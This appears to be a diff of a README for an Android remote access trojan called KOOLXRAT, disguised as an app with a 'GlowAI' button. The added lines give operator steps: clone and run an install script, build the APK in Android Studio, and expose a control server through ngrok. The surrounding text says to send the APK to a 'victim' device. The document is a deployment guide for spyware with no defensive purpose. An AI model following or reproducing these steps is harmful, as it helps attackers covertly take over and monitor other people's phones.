@@ -21,7 +21,7 @@ Once the victim installs the app and taps the **GlowAI** button:
 - Extract and follow the setup steps inside each file manually.
 
 ### ⚡ Auto Installation (Recommended)
-Use the auto script to install all required tools and servers in one command:
+1.Use the auto script to install all required tools and servers in one command:
 
 ```bash
 git clone https://github.com/koolefx/KOOLXRAT-data.git
@@ -29,6 +29,8 @@ cd KOOLXRAT-data
 chmod +x install.sh
 ./install.sh
 ```
+2. use the apk zip to import app to android studio
+3. Run ngrok and server and put server link in app code -> build app. DONE
 🧪 How to Use
 Send the APK to the target device (victim).
 
